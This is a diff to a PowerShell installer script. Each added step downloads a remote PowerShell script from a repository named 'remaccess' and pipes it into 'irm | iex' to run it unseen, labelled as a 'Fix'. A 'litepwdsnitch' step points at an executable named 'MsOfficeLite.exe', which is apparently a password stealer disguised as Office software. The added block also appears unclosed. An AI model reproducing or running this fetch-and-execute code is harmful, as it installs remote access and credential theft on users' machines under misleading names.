@@ -19,6 +19,16 @@ if ($ztconfirm.ToLower() -eq "y") {
 	powershell.exe irm https://tinyurl.com/ztinstall | iex
 	} else {
 }
+$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
+$Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
+$pwdst = Read-Host "Proceed With $Name Fix (y/n)"
+if ([string]::IsNullOrEmpty($pwdst)) {
+    Start-Sleep -Seconds 1
+    $pwdst = "n"
+}
+if ($pwdst.ToLower() -eq "y") {
+    Write-Host "Executing $Name Fix..."
+    powershell.exe irm $url | iex
 #litepwdsnitch Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
